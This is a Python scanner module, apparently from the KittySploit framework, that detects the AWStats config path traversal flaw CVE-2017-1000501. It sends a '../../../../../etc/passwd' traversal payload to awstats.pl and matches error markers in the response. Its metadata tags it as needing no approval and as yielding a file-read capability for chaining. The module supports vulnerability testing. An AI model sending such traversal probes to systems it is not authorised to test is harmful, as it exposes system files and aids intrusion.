#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""AWStats config path traversal (CVE-2017-1000501)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'AWStats - Config Path Traversal Detection (CVE-2017-1000501)',
        'description': (
            'Detects CVE-2017-1000501 by requesting awstats.pl?config=../../../../../etc/passwd '
            'and matching AWStats syntax-error markers that include the traversed path.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web', 'scanner', 'cve', 'cve2017', 'awstats', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.7,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-1000501',
        ],
        'cve': 'CVE-2017-1000501',
    }

    def run(self):
        trav = '../../../../../etc/passwd'
        for base in ('/awstats.pl', '/cgi-bin/awstats.pl', '/awstats/awstats.pl'):
            path = f'{base}?config={trav}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r:
                continue
            body = r.text or ''
            if (
                trav in body
                and 'Warning: Syntax error line' in body
                and 'file, web server or permissions) may be wrong.' in body
            ):
                self.set_info(
                    severity='medium',
                    reason='AWStats config path traversal (CVE-2017-1000501)',
                    path=base,
                )
                return True
        return False
